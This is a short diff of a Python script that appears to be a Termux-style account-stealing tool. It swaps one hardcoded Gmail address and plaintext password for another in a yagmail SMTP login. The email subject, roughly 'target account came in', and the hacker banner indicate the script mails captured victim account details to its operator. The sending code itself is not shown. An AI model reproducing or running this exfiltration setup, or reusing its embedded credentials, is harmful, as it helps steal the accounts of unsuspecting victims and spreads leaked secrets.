@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # coding=utf-8
 import socket,struct,os,sys,time,yagmail
-x=yagmail.SMTP('deteksiakun3452@gmail.com','akun3452')
+x=yagmail.SMTP('akuntermux3452@gmail.com','termux3452')
 subject='AKUN TARGET MASUK'
 logo = """\033[1;94m█████████
 \033[1;94m█▄█████▄█      \033[1;94m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
